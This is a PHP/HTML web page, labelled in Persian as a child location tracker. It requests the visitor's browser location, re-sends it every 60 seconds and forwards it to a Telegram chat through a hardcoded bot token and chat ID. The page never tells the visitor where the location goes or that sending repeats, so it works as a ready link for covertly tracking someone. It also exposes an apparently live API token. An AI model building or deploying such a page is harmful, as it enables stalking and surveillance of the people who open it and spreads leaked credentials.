<?php
if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($_SERVER['REQUEST_URI'], 'send-location') !== false) {
    $data = json_decode(file_get_contents("php://input"), true);
    $token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";  // توکن شما
    $chat_id = "-1002570608346";  // چت آیدی شما

    if (isset($data["latitude"], $data["longitude"])) {
        $lat = $data["latitude"];
        $lon = $data["longitude"];
        $url = "https://api.telegram.org/bot$token/sendLocation?" . http_build_query([
            "chat_id" => $chat_id,
            "latitude" => $lat,
            "longitude" => $lon
        ]);
        file_get_contents($url);
        echo json_encode(["status" => "ok"]);
    } else {
        echo json_encode(["status" => "error", "message" => "Invalid input"]);
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ردیاب موقعیت فرزند</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Tahoma, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      background: white;
      padding: 35px 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 340px;
      text-align: center;
    }
    .form-container h2 {
      margin-bottom: 25px;
      color: #333;
    }
    #status {
      margin-top: 20px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>در حال دریافت موقعیت...</h2>
    <div id="status">لطفاً اجازه دسترسی به موقعیت مکانی را بدهید.</div>
  </div>

  <script>
    function sendLocation() {
      if (!navigator.geolocation) {
        document.getElementById("status").innerText = "مرورگر از موقعیت مکانی پشتیبانی نمی‌کند.";
        return;
      }

      navigator.geolocation.getCurrentPosition(position => {
        fetch('tracker.php/send-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        })
        .then(res => res.json())
        .then(data => {
          if (data.status === "ok") {
            document.getElementById("status").innerText = "موقعیت با موفقیت ارسال شد.";
          } else {
            document.getElementById("status").innerText = "خطا در ارسال موقعیت.";
          }
        })
        .catch(() => {
          document.getElementById("status").innerText = "خطا در ارتباط با سرور.";
        });
      }, () => {
        document.getElementById("status").innerText = "اجازه دسترسی به موقعیت داده نشد.";
      });
    }

    // ارسال موقعیت مکانی بدون نیاز به رفرش صفحه
    sendLocation();  // ارسال موقعیت مکانی در ابتدا
    setInterval(sendLocation, 60000);  // ارسال هر ۶۰ ثانیه
  </script>
</body>
</html>
